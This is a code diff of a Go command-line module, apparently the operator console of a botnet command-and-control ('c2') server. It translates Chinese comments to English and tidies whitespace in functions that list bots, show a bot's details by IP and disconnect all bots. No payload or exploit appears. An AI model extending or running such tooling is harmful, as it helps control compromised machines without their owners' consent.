@@ -3,17 +3,17 @@ package cli
 import (
 	"fmt"
 	"os"
-	
+
 	"c2/bot"
 	"c2/config"
 )
 
-// ShowBanner 显示程序启动横幅
+// ShowBanner displays the program startup banner
 func ShowBanner() {
 	fmt.Println(config.GetBanner())
 }
 
-// ShowBotList 显示机器人列表
+// ShowBotList displays the list of bots
 func ShowBotList() {
 	bot.BotMu.Lock()
 	defer bot.BotMu.Unlock()
@@ -49,12 +49,12 @@ func ShowBotList() {
 	}
 }
 
-// ShowHelp 显示帮助信息
+// ShowHelp displays help information
 func ShowHelp() {
 	fmt.Println(config.GetCommandHelp())
 }
 
-// ShowBotInfo 显示指定机器人的详细信息
+// ShowBotInfo displays detailed information about a specific bot
 func ShowBotInfo(args []string) {
 	if len(args) == 0 {
 		fmt.Println("[!] Please specify bot IP")
@@ -82,12 +82,12 @@ func ShowBotInfo(args []string) {
 	}
 }
 
-// ClearScreen 清除屏幕
+// ClearScreen clears the screen
 func ClearScreen() {
 	fmt.Print("\033[H\033[2J")
 }
 
-// CleanExit 干净地退出程序
+// CleanExit exits the program cleanly
 func CleanExit() {
 	fmt.Println("\n[!] Disconnecting all bots...")
 	bot.BotMu.Lock()
